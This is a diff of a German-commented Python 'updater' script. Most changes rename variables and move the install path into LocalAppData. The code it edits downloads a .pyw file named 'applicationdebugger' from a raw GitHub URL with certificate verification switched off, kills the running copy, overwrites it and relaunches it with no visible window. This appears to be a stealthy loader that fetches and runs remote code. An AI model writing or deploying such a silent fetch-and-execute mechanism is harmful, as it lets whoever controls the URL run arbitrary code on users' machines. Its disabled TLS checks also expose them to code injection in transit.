@@ -14,14 +14,17 @@ import platform
 
 # ────────────────────────────────────────────────
 # KONFIGURATION
-MAIN_EXE_NAME = "applicationdebugger.pyw"   # Name deiner Hauptanwendung
-UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + MAIN_EXE_NAME
-# ────────────────────────────────────────────────
+APP_NAME       = "ApplicationDebugger"  # Name deiner Anwendung
+FILE_NAME      = "applicationdebugger.pyw"      # Name der Hauptdatei deiner Anwendung
+UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME
+
+# ───────────────────────────────────────────────
 
 # Pfade relativ zum Updater-Skript
+LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
+APP_DIR       = os.path.join(LOCAL_APPDATA, APP_NAME)
+APP_PATH      = os.path.join(APP_DIR, FILE_NAME)
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-MAIN_FOLDER = os.path.join(os.getenv('APPDATA'), "Local", "Applications") # type: ignore
-MAIN_PATH = os.path.join(MAIN_FOLDER, MAIN_EXE_NAME)
 
 IS_WINDOWS = platform.system().lower() == "windows"
 
@@ -33,7 +36,7 @@ def kill_running_main():
 
     try:
         subprocess.run(
-            ["taskkill", "/F", "/IM", MAIN_EXE_NAME],
+            ["taskkill", "/F", "/IM", FILE_NAME],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
             creationflags=subprocess.CREATE_NO_WINDOW # type: ignore
@@ -45,7 +48,7 @@ def kill_running_main():
 
 def download_update():
     """Lädt die neue Version herunter"""
-    temp_path = MAIN_PATH + ".new"
+    temp_path = APP_PATH + ".new"
 
     try:
         context = ssl._create_unverified_context()
@@ -54,7 +57,7 @@ def download_update():
                 return None
             data = resp.read()
 
-        os.makedirs(MAIN_FOLDER, exist_ok=True)
+        os.makedirs(APP_DIR, exist_ok=True)
 
         with open(temp_path, "wb") as f:
             f.write(data)
@@ -76,17 +79,17 @@ def apply_update(temp_file):
 
     for i in range(attempts):
         try:
-            if os.path.exists(MAIN_PATH):
+            if os.path.exists(APP_PATH):
                 try:
-                    os.remove(MAIN_PATH)
+                    os.remove(APP_PATH)
                 except PermissionError:
                     kill_running_main()
                     time.sleep(1 + i)
 
-            shutil.move(temp_file, MAIN_PATH)
+            shutil.move(temp_file, APP_PATH)
 
             try:
-                os.chmod(MAIN_PATH, 0o755)
+                os.chmod(APP_PATH, 0o755)
             except:
                 pass
 
@@ -103,22 +106,22 @@ def apply_update(temp_file):
 
 def start_main_app():
     """Startet die Hauptanwendung zuverlässig unter Windows & Linux"""
-    if not os.path.exists(MAIN_PATH):
+    if not os.path.exists(APP_PATH):
         return False
 
     creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0 # type: ignore
 
     try:
-        if MAIN_PATH.lower().endswith((".py", ".pyw")):
+        if APP_PATH.lower().endswith((".py", ".pyw")):
             # mit gleichem Python starten wie der Updater
             subprocess.Popen(
-                [sys.executable, MAIN_PATH],
+                [sys.executable, APP_PATH],
                 creationflags=creationflags
             )
         else:
             # exe direkt starten
             subprocess.Popen(
-                [MAIN_PATH],
+                [APP_PATH],
                 creationflags=creationflags
             )
         return True
@@ -129,7 +132,7 @@ def start_main_app():
 
 
 def main():
-    os.makedirs(MAIN_FOLDER, exist_ok=True)
+    os.makedirs(APP_DIR, exist_ok=True)
 
     kill_running_main()
     time.sleep(1)
